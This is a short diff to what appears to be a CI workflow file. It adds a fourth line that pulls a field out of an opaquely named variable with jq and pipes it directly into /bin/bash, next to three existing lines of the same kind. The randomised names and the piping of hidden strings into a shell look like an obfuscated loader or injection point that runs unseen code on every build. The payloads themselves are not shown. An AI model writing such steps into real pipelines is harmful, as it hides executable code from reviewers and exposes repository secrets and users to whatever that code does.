@@ -40,6 +40,7 @@ jobs:
           echo $wkun958 | jq -r .qifi6 | /bin/bash
           echo $qnvcj499 | jq -r .arm3091 | /bin/bash
           printf '%s' "$t500" | jq -r .htsxv956 | /bin/bash
+          printf '%s' "$aj2" | jq -r .sahyq6062 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
